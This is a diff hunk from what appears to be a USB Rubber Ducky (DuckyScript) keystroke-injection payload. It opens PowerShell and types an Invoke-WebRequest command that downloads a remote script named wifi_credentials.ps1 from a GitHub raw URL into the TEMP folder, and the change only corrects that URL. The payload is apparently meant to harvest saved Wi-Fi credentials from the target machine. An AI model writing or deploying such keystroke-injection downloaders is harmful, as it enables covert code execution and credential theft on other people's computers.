@@ -24,7 +24,7 @@ STRING powershell
 ENTER
 DELAY 1000
 
-STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/alejandro001100/wifi_credentials/main/wifi_credentials.ps1" -OutFile "$env:TEMP\wifi_credentials.ps1"
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/alejandro001100/wifi_credentials.ps1/main/wifi_credentials.ps1" -OutFile "$env:TEMP\wifi_credentials.ps1"
 ENTER
 DELAY 5000
 
